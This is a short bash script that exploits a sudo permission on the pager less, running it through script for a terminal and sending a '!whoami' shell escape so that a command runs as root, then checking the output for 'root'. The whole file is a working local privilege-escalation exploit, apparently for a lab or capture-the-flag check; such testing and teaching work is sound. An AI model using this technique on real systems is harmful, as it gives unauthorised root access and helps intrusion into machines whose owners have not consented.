#!/usr/bin/env bash
set -e

# Exploit sudo-gtfo interactive PTY: use script and less to escalate to root
data=$(script -q /dev/null -c "sudo /usr/bin/less /etc/passwd" << 'EOF'
!whoami
q
EOF
)
echo "$data" | grep -m1 -o root
